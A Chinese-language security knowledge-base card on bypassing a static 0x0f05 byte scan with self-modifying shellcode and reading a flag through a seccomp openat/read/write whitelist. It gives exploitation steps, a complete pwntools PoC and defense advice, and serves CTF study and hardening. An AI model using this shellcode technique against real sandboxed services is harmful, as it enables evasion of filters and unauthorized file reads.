---
id: binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw
title: RWX shellcode 自修改绕过 syscall 字节扫描 + seccomp 白名单 openat ORW
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: self-modifying-shellcode-syscall-filter-bypass
tags:
- pwn
- shellcode
- seccomp
- self-modifying-code
- orw
- rwx
- sandbox-escape
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:58:00+08:00'
  notes: 已对照原文与图08-09核对：checksec chal（图08）与 seccomp-tools dump（图09）显示 arch 检查后仅 ALLOW openat/read/write/exit、其余 KILL，与卡内白名单一致；mmap(0x1000,7,34)、read 0x100、逐字节扫描 0x0f05、自修改 inc byte ptr [rip]+0x0e05、openat(-100,"/flag")→read→write 的 ORW 链均与原文一致；inc 指令 6 字节与 RIP 相对寻址解释正确，openat 第4参数在 R10 的提醒正确。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw/
draft: false
kb_aliases:
- 自修改 shellcode 绕过 0f05
- inc byte ptr [rip] syscall
- seccomp ORW openat
- RWX shellcode 沙箱
- 静态字节扫描绕过
- ORW 读 flag
---

## 一句话结论

当程序把输入放进 RWX 内存、静态扫描 `0x0f 0x05` 禁止 `syscall`、再安装只放行 `openat/read/write/exit` 的 seccomp 白名单时，可用自修改 shellcode（`inc byte ptr [rip]; .byte 0x0e, 0x05`）在运行时把 `0x0e` 改成 `0x0f` 组成 `syscall`，再用 `openat` + `read` + `write` 的 ORW 链读取 flag。

## 原理

- `mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)` 返回 RWX 页，输入的 shellcode 既被执行也允许在运行时改写自身字节。
- 程序在安装 seccomp 前逐字节扫描输入，只要相邻两个字节是 `0x0f 0x05`（x86-64 的 `syscall` 指令编码）就拒绝执行；这是纯静态字节匹配，不理解指令语义，也不考虑代码在运行时会被修改。
- 自修改技巧：先让输入中不含 `0f 05`，而写入 `inc byte ptr [rip]` 紧跟 `.byte 0x0e, 0x05`。x86-64 下 `inc byte ptr [rip]` 是带 RIP 相对寻址的 6 字节指令，RIP 在执行该指令后指向下一条指令的第一个字节，即 `0x0e`；自增后变为 `0x0f`，随后 CPU 把 `0x0f 0x05` 解码为 `syscall`。静态扫描看到的是 `0e 05`，不会命中。
- x86 的指令缓存与数据缓存保持一致，执行流写入自身代码后无需额外刷新即可看到修改（其他架构可能需要 `__builtin___clear_cache` 或序列化指令）。
- seccomp 规则（`seccomp-tools dump` 的结构）先检查 arch 为 `ARCH_X86_64`，然后只对 `sys_number` 等于 `openat`(257)、`read`(0)、`write`(1)、`exit`(60) 的分支返回 `ALLOW`，其余返回 `KILL`。这是白名单，不是黑名单；`execve`、`open` 都会被杀死。
- 因此不能弹 shell，必须走 ORW：`openat(AT_FDCWD, "/flag", O_RDONLY, 0)` 得到 fd，`read(fd, rsp, 0x100)` 把内容读到栈，`write(1, rsp, 0x100)` 输出到 stdout。RDI/RSI/RDX/RAX 按系统调用约定设置，`openat` 的第 4 个参数在 R10（本例置 0）。

## 触发条件

- 用户可控字节被放入可写且可执行的映射（RWX），或程序存在可被利用的 JIT/代码页写原语。
- 程序对输入做静态 `0x0f 0x05` 字节扫描，但没有反汇编/规范化/运行时校验。
- seccomp 过滤器禁止 `execve`/`open` 等，但放行 `openat`、`read`、`write`（常见于 CTF 的 ORW 题），且未对 `openat` 路径做参数级限制。
- `openat` 所需的目标文件（如 `/flag`）对当前进程可读。

## 利用步骤

1. `checksec`、反汇编确认 mmap 权限为 7（RWX）、输入长度、扫描逻辑与 seccomp 安装顺序。
2. 用 `seccomp-tools dump ./chal` 获取 BPF 规则，确认允许的系统调用号与默认动作（KILL/ERRNO）。
3. 将每条 `syscall` 写成 `inc byte ptr [rip]` + `.byte 0x0e, 0x05` 的自修改序列，确保汇编结果中不存在 `0f 05`；可在本地 `assert b"\x0f\x05" not in payload`。
4. 按 ORW 布置寄存器：`rax=257, rdi=-100, rsi=&"/flag", rdx=0, r10=0`；随后 `rax=0, rdi=fd, rsi=rsp, rdx=0x100`；最后 `rax=1, rdi=1, rsi=rsp, rdx=0x100`。
5. 发送 shellcode；若输出为空或进程被杀，用 strace/seccomp 日志确认是哪个系统调用被 KILL，再核对系统调用号与参数寄存器。
6. 读取 `write` 输出的 flag。

## PoC

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

shellcode_asm = """
#define SAFE_SYSCALL \\
    inc byte ptr [rip]; \\
    .byte 0x0e, 0x05

    mov rax, 257          /* openat */
    mov rdi, -100         /* AT_FDCWD */
    lea rsi, [rip + flag_str]
    xor rdx, rdx
    xor r10, r10
    SAFE_SYSCALL

    mov rdi, rax          /* fd */
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax          /* read */
    SAFE_SYSCALL

    mov rdi, 1            /* stdout */
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1            /* write */
    SAFE_SYSCALL

flag_str:
    .string "/flag"
"""

payload = asm(shellcode_asm)
assert b"\x0f\x05" not in payload, "static syscall bytes still present"

p = remote(host, port)
p.sendlineafter(b"max 0x100 bytes): ", payload)
p.interactive()
```

```text
seccomp 白名单（本例）：
  openat(257) / read(0) / write(1) / exit(60) -> ALLOW
  其余 -> KILL
```

## 变体与关联

- 变体：若扫描器检查的是单字节 `0x0f` 或对指令做规范化，单纯改 `0x0e` 不够；可换用等价编码、把 `syscall` 拆到运行时生成、用 `call`/`int 0x80`（若沙箱允许 32 位调用）等方式，但都要先确认沙箱与架构。
- 变体：若 seccomp 只允许 `openat` 且限制路径，可改用 `openat2`（若放行）、`readlink`、`stat` 等泄露，或先读 `/proc/self/maps` 寻找其他可读文件。
- 变体：若 RWX 不可得但存在可写代码页/JIT，可用同样的“运行前修补字节”思路；W^X 环境下则需要代码复用或数据-only 攻击。
- 关联：[[binary-pwn-sandbox-escape-seccomp-write-fd-fcntl-dup2]]（seccomp 允许 write 但限制 fd 时用 dup2 重映射）、[[binary-pwn-sandbox-escape-ifunc-resolver-before-constructor-seccomp]]（seccomp 安装时序绕过）。
- 边界：`openat` 的第 4 个参数在 R10 而非 RCX；`read` 的缓冲区用 `rsp` 时注意 shellcode 自身的栈空间足够；自修改序列的 `inc` 指令字节本身也不能意外形成 `0f 05`。

## 检测与防御

- 检测：审计 `mmap` 的 `PROT_EXEC|PROT_WRITE` 组合与执行用户输入的代码路径；静态字节扫描不能作为安全边界；监控进程执行 `openat` 读取敏感路径、以及 seccomp 的 KILL 事件。
- 修复：不要映射 RWX；采用 W^X（先写后 `mprotect` 为 RX，或 JIT 双映射），执行前用反汇编器/验证器检查指令而不是字节匹配；seccomp 白名单尽量收紧参数（如限制 `openat` 路径、用 `openat2` + `RESOLVE_*`、Landlock），并对敏感文件降权。
- 加固：默认 `SECCOMP_RET_KILL_PROCESS`；禁止 `execve`/`execveat`；容器内只挂载必要文件；flag 文件权限最小化；对用户提交的 shellcode 在独立低权限进程/沙箱中运行。
